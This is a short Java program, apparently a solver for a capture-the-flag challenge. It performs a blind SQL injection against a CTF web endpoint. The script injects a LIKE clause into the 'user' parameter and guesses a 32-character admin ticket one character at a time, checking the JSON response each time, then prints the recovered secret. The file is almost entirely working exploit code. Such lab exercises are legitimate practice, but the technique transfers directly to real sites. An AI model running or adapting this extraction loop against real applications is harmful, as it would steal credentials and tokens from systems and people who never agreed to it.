package spider;

import com.alibaba.fastjson.JSON;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

/**
 * @author by Administrator on 2021/6/30.
 */
public class Sql {
    public static void main(String[] args) throws UnsupportedEncodingException {
        StringBuilder resText = new StringBuilder();
        String s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
        for(int i=0;i<32;i++){
            for (char c : s.toCharArray()) {
                // 建立连接，获取网页内容
                String url = "http://jzsec-ctf.djtest.cn/sql2?user=shibo%27%20and%20admin_ticket%20like%20%27" + resText + c +"%";
                String html = ConnectionUtil.Connect(url);
                // 将内容转换成dom格式，方便操作
                Res res = JSON.parseObject(html, Res.class);
                if (!res.getData().equals("00000000000000000000000000000000")) {
                    resText.append(c);
                    break;
                }
            }
        }
        System.out.println(resText);
    }
}

class Res {
    String code;
    String data;
    String sql;

    public String getCode() {
        return code;
    }

    public void setCode(String code) {
        this.code = code;
    }

    public String getData() {
        return data;
    }

    public void setData(String data) {
        this.data = data;
    }

    public String getSql() {
        return sql;
    }

    public void setSql(String sql) {
        this.sql = sql;
    }
}
